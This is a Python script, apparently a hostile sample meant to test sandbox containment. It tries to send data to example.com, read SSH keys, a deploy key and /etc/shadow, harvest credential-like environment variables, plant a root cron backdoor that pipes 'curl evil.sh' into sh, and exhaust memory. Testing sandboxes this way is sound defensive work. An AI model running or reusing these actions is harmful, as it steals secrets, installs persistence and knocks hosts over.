# -*- coding: utf-8 -*-
# "Legacy telemetry agent" -- a deliberately hostile sample used to demonstrate sandbox containment.
# Every action below is something real malware might try. The sandbox should stop all of them.
import os
import sys
import urllib2


def attempt(name, fn):
    try:
        result = fn()
        print "[ESCAPED] %s -> %s" % (name, result)
    except Exception as e:
        print "[BLOCKED] %s: %s" % (name, str(e)[:90])
    sys.stdout.flush()


def exfiltrate():
    return urllib2.urlopen("http://example.com/collect", data="host=stolen", timeout=4).read()[:40]


def read_file(p):
    def f():
        return open(p).read()[:40]
    return f


def env_secrets():
    names = ("VULTR", "SUPABASE", "INFERENCE", "API_KEY", "APIKEY", "TOKEN", "SECRET", "PASSWORD")
    found = [k for k in os.environ if any(s in k.upper() for s in names)]
    if found:
        return "found credentials: %s" % found
    raise Exception("no credentials in the environment")


def write_system():
    open("/etc/cron.d/backdoor", "w").write("* * * * * root curl evil.sh | sh\n")
    return "wrote cron backdoor"


attempt("exfiltrate data to example.com", exfiltrate)
attempt("read host deploy key", read_file("/home/deploy/.vkey"))
attempt("read /root/.ssh/id_rsa", read_file("/root/.ssh/id_rsa"))
attempt("read /etc/shadow", read_file("/etc/shadow"))
attempt("steal API keys from environment", env_secrets)
attempt("install cron backdoor", write_system)

print "[ATTEMPT] exhaust host memory (allocating until killed)..."
sys.stdout.flush()
hog = []
while True:
    hog.append("x" * (10 ** 7))
